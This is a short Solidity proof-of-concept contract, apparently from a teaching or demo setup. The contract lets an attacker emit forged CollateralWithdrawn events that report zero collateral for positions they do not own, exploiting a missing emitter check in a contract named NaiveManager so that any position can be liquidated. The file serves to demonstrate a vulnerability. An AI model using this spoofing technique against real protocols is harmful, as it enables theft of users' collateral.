// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title MaliciousVault — a fake vault an attacker deploys on Sepolia
 * @dev Emits a real CollateralWithdrawn event for a positionId the attacker does
 * not own, reporting remaining=0. The event is genuine and provable; the vault is
 * a lie. Exploits BUG 2 (no emitter check) in NaiveManager to liquidate anyone.
 */
contract MaliciousVault {
    event CollateralWithdrawn(uint256 indexed positionId, uint256 amount, uint256 remaining);

    function forge(uint256 positionId) external {
        emit CollateralWithdrawn(positionId, 0, 0); // "victim has 0 collateral left"
    }
}
